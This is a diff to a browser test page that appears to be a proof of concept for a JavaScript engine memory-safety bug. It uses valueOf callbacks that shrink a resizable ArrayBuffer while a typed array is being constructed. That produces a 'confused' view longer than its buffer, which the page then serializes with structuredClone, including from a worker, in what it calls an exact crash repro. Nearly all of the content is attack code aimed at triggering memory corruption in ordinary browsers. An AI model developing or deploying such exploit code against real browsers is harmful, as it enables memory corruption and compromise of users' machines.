@@ -9,15 +9,16 @@ const log=m=>o.textContent+="\n"+m;
 window.addEventListener('error',e=>log("[ERROR] "+e.message));
 log("[*] start");
 
+(async()=>{
 // F1: ctor with resize side effects, huge legal element counts
-for(const [name,ctor,nElems] of [["u8",Uint8Array,0x80000000-1],["f64",Float64Array,0x10000000],["u32",Uint32Array,0x20000000]]){
+for(const [name,ctor,nElems] of [["u8",Uint8Array,0x7FFFFFFF],["f64",Float64Array,0x10000000],["u32",Uint32Array,0x20000000]]){
   try{
     const ab=new ArrayBuffer(0x1000,{maxByteLength:0x10000});
     let ph=0;
     const v=new ctor(ab,
       {valueOf(){ph++;if(ph===1){try{ab.resize(16);}catch(_){}}return 0;}},
       {valueOf(){ph++;if(ph===2){try{ab.resize(16);}catch(_){}}return nElems;}});
-    const confused=v.length*ctor.BYTES_PER_ELEMENT>ab.byteLength;
+    const confused=(v.length*ctor.BYTES_PER_ELEMENT)>ab.byteLength;
     log(name+": v.len="+v.length+" bytes="+(v.length*ctor.BYTES_PER_ELEMENT)+" ab="+ab.byteLength+(confused?" *** CONFUSED ***":""));
     if(confused){
       try{ const s=structuredClone(v); log(name+" serialize SURVIVED "+s.byteLength); }
@@ -53,7 +54,7 @@ for(let i=0;i<30000;i++){
 }
 log("BRUTE done hits="+hits);
 
-// F4: exact crash repro attempt — confused f64 view + structuredClone from worker
+// F4: exact crash repro — confused f64 view + structuredClone from worker
 try{
   const w=new Worker(URL.createObjectURL(new Blob([`
 onmessage=e=>{
@@ -71,4 +72,5 @@ onmessage=e=>{
   w.onmessage=e=>log("F4 worker: "+JSON.stringify(e.data));
 }catch(e){log("F4: "+e.name);}
 log("DONE");
+})();
 </script>
